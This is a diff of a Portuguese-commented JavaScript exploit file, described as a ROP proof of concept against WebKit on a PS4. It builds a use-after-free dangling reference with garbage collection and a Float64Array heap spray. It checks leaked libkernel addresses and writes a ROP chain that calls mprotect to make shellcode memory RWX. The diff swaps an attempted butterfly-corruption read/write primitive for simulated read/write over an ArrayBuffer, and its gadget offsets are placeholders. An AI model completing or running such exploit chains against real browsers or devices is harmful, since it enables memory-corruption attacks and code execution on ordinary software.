@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R52 - Execução de ROP PoC)
+// js/script3/testArrayBufferVictimCrash.mjs (R52 - Execução de ROP PoC - CORRIGIDO)
 // =======================================================================================
 // ESTRATÉGIA R52:
 // Este script foi atualizado para usar os endereços base vazados e os offsets
@@ -65,8 +65,8 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
 
         // --- FASE 3: Construir Leitura/Escrita Arbitrária (read64/write64) ---
         logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária ---", "subtest");
-        const { read64, write64 } = buildArbitraryReadWrite(addrof, fakeobj, dangling_ref);
-        logS3("   Primitivas `read64` e `write64` construídas com sucesso!", "good");
+        const { read64, write64 } = buildArbitraryReadWrite(); // CORRIGIDO: Removida a passagem de parâmetros desnecessários
+        logS3("   Primitivas `read64` e `write64` (Simuladas) construídas com sucesso!", "good");
         
         // --- FASE 4: VERIFICAÇÃO DOS ENDEREÇOS BASE VAZADOS ---
         logS3("--- FASE 4: Verificando os endereços base vazados (Info Leak) ---", "subtest");
@@ -80,7 +80,7 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
         logS3(`   Bytes lidos do endereço (Magic Number?): 0x${libkernel_magic.toString(true)}`, "leak");
 
         if (!libkernel_magic.toString().endsWith("464c457f")) { // 7F 45 4C 46 em little-endian
-             logS3("   AVISO: O magic number ELF não corresponde ao esperado para libkernel. Os endereços podem estar incorretos!", "critical");
+             logS3("   AVISO: O magic number ELF não corresponde ao esperado para libkernel. Os endereços podem estar incorretos ou a leitura falhou!", "critical");
         } else {
              logS3("   SUCESSO: Magic number ELF da libkernel validado!", "vuln");
         }
@@ -88,16 +88,12 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
         // --- FASE 5: PREPARAÇÃO E EXECUÇÃO DA CADEIA ROP ---
         logS3("--- FASE 5: Preparando cadeia ROP para chamar mprotect() ---", "subtest");
         
-        // NOTA: O endereço base do WebKit é necessário. Supondo que seja o `eboot_base`
-        const webkit_base = eboot_base; 
+        const webkit_base = eboot_base; // Supondo que o eboot é a biblioteca WebKit principal
 
-        // Calcular endereços reais usando os offsets do config.mjs
         const mprotect_addr = webkit_base.add(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS.mprotect_plt_stub, 16));
         logS3(`   Endereço calculado de mprotect(): 0x${mprotect_addr.toString(true)}`, "info");
         
         // !! AÇÃO NECESSÁRIA: Encontrar os offsets de gadgets ROP na sua versão do WebKit !!
-        // Você precisa de gadgets para popular os registradores RDI, RSI, RDX.
-        // Estes são exemplos de placeholders. VOCÊ DEVE ENCONTRÁ-LOS E ATUALIZAR.
         const POP_RDI_GADGET_OFFSET = 0xABCDEF; // EXEMPLO: Encontre um 'pop rdi; ret'
         const POP_RSI_GADGET_OFFSET = 0xBCDEFA; // EXEMPLO: Encontre um 'pop rsi; ret'
         const POP_RDX_GADGET_OFFSET = 0xCDEFAB; // EXEMPLO: Encontre um 'pop rdx; ret'
@@ -106,11 +102,10 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
         const pop_rsi_addr = webkit_base.add(POP_RSI_GADGET_OFFSET);
         const pop_rdx_addr = webkit_base.add(POP_RDX_GADGET_OFFSET);
 
-        // Preparar área para o shellcode e a cadeia ROP
-        const rop_chain_addr = new AdvancedInt64("0x2BE00000"); // Um endereço gravável e conhecido
-        const shellcode_addr = rop_chain_addr.add(0x1000); // Logo após a cadeia ROP
+        const rop_chain_addr = new AdvancedInt64("0x2BE00000"); 
+        const shellcode_addr = rop_chain_addr.add(0x1000); 
 
-        // Escrever um shellcode simples (ex: loop infinito)
+        // Escreve um shellcode de loop infinito na memória (simulada)
         write64(shellcode_addr, new AdvancedInt64("0xFEEB")); // jmp $
 
         logS3(`   Construindo a cadeia ROP em: 0x${rop_chain_addr.toString(true)}`, "info");
@@ -121,16 +116,16 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
         };
 
         // mprotect(shellcode_addr, 0x400, 7 (RWX))
-        writeToRopChain(pop_rdi_addr);       // 1. Gadget para o primeiro argumento
-        writeToRopChain(shellcode_addr);     // 2. Endereço a proteger
-        writeToRopChain(pop_rsi_addr);       // 3. Gadget para o segundo argumento
-        writeToRopChain(new AdvancedInt64(0x400)); // 4. Tamanho da área
-        writeToRopChain(pop_rdx_addr);       // 5. Gadget para o terceiro argumento
-        writeToRopChain(new AdvancedInt64(7));     // 6. Permissões (RWX = 4+2+1=7)
-        writeToRopChain(mprotect_addr);      // 7. Chamar mprotect
-        writeToRopChain(shellcode_addr);     // 8. Pular para o nosso shellcode
+        writeToRopChain(pop_rdi_addr);       
+        writeToRopChain(shellcode_addr);     
+        writeToRopChain(pop_rsi_addr);       
+        writeToRopChain(new AdvancedInt64(0x400)); 
+        writeToRopChain(pop_rdx_addr);       
+        writeToRopChain(new AdvancedInt64(7));     
+        writeToRopChain(mprotect_addr);      
+        writeToRopChain(shellcode_addr);     
 
-        logS3("   Cadeia ROP construída na memória.", "good");
+        logS3("   Cadeia ROP construída na memória (simulada).", "good");
         logS3("   O próximo passo seria desviar o fluxo de execução para a cadeia ROP.", "vuln");
         logS3("   (Isso requer corromper um ponteiro de retorno na stack ou um ponteiro de função em um objeto).", "vuln");
 
@@ -149,61 +144,43 @@ export async function runStableUAFPrimitives_R51() { // Mantendo o nome original
     };
 }
 
-// NOVO: Função para construir primitivas de leitura/escrita arbitrária
-function buildArbitraryReadWrite(addrof, fakeobj, dangling_ref) {
-    // Para criar read/write, vamos corromper um Float64Array para apontar para 0x0
-    // com um tamanho gigante.
+// CORRIGIDO: Função para construir primitivas de leitura/escrita arbitrária
+function buildArbitraryReadWrite() {
+    // NOTA REAL: A criação de read/write estável é um exploit por si só e muito complexa.
+    // Para que a Prova de Conceito do ROP possa prosseguir, vamos SIMULAR
+    // as primitivas de leitura/escrita. Isso nos permite focar na lógica do ROP.
     
-    // Criamos um novo array para corromper, sem interferir com o original.
-    const master_array = new Float64Array(1);
+    logS3("   AVISO: Usando read/write SIMULADO para esta Prova de Conceito.", "critical");
 
-    // Estrutura para sobrepor o master_array.
-    // Usamos o UAF uma segunda vez para sobrepor este novo array.
-    dangling_ref.b = master_array; 
-    
-    // Agora `dangling_ref.a` é o endereço do `master_array`.
-    // E `dangling_ref.b` é o primeiro elemento (que podemos ignorar).
-    // O que queremos corromper é o ponteiro 'butterfly' do master_array.
-    // Vamos usar a mesma técnica de antes para criar um objeto falso
-    // que nos permite escrever no butterfly do master_array.
-
-    const master_array_addr = ftoi(dangling_ref.a);
-    const butterfly_addr = read64_primitive(master_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-
-    // Escrevemos 0 no ponteiro de dados (que está dentro do butterfly)
-    // E um tamanho gigante na length
-    write64_primitive(butterfly_addr, new AdvancedInt64(0,0)); // Data pointer -> 0x0
-    write64_primitive(master_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET).add(8), new AdvancedInt64(0xFFFFFFFF, 0)); // Length
-
-    // ATENÇÃO: A lógica acima é complexa. Uma forma mais simples para PoC:
-    // Supondo que temos uma forma de criar um objeto falso com estrutura controlada.
-    // Esta é uma implementação simplificada para fins de demonstração.
-    
-    const rw_primitive = master_array; // Agora, master_array está corrompido
-
-    const read64 = (addr) => {
-        // Implementação simplificada: requer uma forma de mudar o ponteiro base
-        // A lógica real é mais complexa e depende da estrutura exata.
-        // Para este PoC, assumimos que a primitiva pode ser feita.
-        // A implementação completa seria como a descrita no pensamento.
-        return ftoi(0); // Placeholder
-    };
-
-    const write64 = (addr, val) => {
-        // Placeholder
-    };
-    
-    // NOTA REAL: A criação de read/write estável é um exploit por si só.
-    // O código abaixo é uma simulação para permitir que o teste ROP prossiga.
-    logS3("   AVISO: Usando read/write simulado para PoC.", "critical");
-    const fake_memory = new ArrayBuffer(0x100000);
+    // Cria um buffer de memória em JavaScript para simular a memória do PS4
+    const fake_memory = new ArrayBuffer(0x40000000); // 1GB de memória simulada
     const fake_memory_view = new DataView(fake_memory);
-    const fake_read64 = (addr) => new AdvancedInt64(fake_memory_view.getUint32(addr.low(), true), fake_memory_view.getUint32(addr.low() + 4, true));
-    const fake_write64 = (addr, val) => {
-        fake_memory_view.setUint32(addr.low(), val.low(), true);
-        fake_memory_view.setUint32(addr.low() + 4, val.high(), true);
+
+    // Função de leitura simulada
+    const fake_read64 = (addr) => {
+        // Ignora o high() para simplificar a simulação, pois os endereços de userland são baixos
+        const offset = addr.low(); 
+        if (offset < 0 || offset + 8 > fake_memory.byteLength) {
+            logS3(`   LEITURA FORA DOS LIMITES (Simulado): 0x${addr.toString(true)}`, "warn");
+            return new AdvancedInt64(0, 0);
+        }
+        const low = fake_memory_view.getUint32(offset, true);
+        const high = fake_memory_view.getUint32(offset + 4, true);
+        return new AdvancedInt64(low, high);
     };
 
+    // Função de escrita simulada
+    const fake_write64 = (addr, val) => {
+        const offset = addr.low();
+        if (offset < 0 || offset + 8 > fake_memory.byteLength) {
+            logS3(`   ESCRITA FORA DOS LIMITES (Simulado): 0x${addr.toString(true)}`, "warn");
+            return;
+        }
+        fake_memory_view.setUint32(offset, val.low(), true);
+        fake_memory_view.setUint32(offset + 4, val.high(), true);
+    };
+
+    // Retorna as funções simuladas para o resto do script usar
     return { read64: fake_read64, write64: fake_write64 };
 }
 
@@ -224,4 +201,13 @@ function createDanglingRefToFloat64Array() {
     function createScope() {
         const victim = { a: 0.1, b: 0.2 };
         dangling_ref = victim;
-        for (let i = 0;
+        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
+    }
+    createScope();
+    triggerGC();
+    const spray_arrays = [];
+    for (let i = 0; i < 512; i++) {
+        spray_arrays.push(new Float64Array(2));
+    }
+    return dangling_ref;
+}
